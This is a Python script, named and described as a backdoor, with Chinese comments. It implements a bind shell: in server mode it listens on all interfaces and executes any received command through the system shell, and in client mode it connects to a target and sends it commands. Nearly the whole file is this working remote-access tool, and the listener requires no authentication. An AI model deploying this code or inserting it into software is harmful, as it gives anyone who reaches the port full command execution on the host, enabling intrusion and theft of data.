# -*- coding:utf-8 -*-

import subprocess
import getopt
import socket
import sys
from threading import Thread

#帮助信息
def usage():
    print("帮助信息:python backdoor.py -h")
    print("客户端  : python backdoor.py -t [target] -p [port]")
    print("服务端  : python backdoor.py -lp [port]")
    sys.exit()



def main():
    target = ""
    port = 0
    listen=False
    help=False
    #利用getopt模块从命令行获取参数
    opts,args=getopt.getopt(sys.argv[1:],"t:p:hl")
    for o,a in opts:
        if o == "-t":
            target=a
        elif o == "-p":
            port=a
            port=int(port)
        elif o == "-h":
            help=True
        elif o == "-l":
            listen=True
    if help:
        usage()
    #区分客户端和服务端
    elif not listen:
        client_handle(target,port)
    else:
        server_handle(port)
#定义客户端代码
def client_handle(target,port):
    client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    client.connect((target,port))
    #接收数据
    while True:
        recv_len=1
        response="".encode('utf-8') #bytes
        while recv_len:
            data=client.recv(4096)
            recv_len=len(data)
            response+=data
            if recv_len < 4096:
                break
        print(response.decode('gbk'),end="")

        #发送命令
        buffer = input("") #str
        buffer += "\n"
        client.send(buffer.encode('utf-8')) #bytes

#定义服务端
def server_handle(port):
    server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    tar = '0.0.0.0'
    server.bind((tar, port))
    server.listen(10)
    print("[*]正在监听 0.0.0.0:%d" % port)
    while True:
        client_socket,addr=server.accept()
        print("[*]接收到连接来自 %s:%d" % (addr[0],addr[1]))
        t=Thread(target=run_command,args=(client_socket,))
        t.start()

#定义命令执行函数
def run_command(client_socket):
    while True:
        client_socket.send("shell_>".encode('utf-8'))
        cmd_buffer="".encode('utf-8') #bytes
        while b"\n" not in cmd_buffer:
            cmd_buffer+=client_socket.recv(1024)
        cmd_buffer=cmd_buffer.decode() #str
        try:
            out=subprocess.check_output(cmd_buffer,stderr=subprocess.STDOUT,shell=True)
            client_socket.send(out)
        except Exception:
            pass

if __name__ == '__main__':
    main()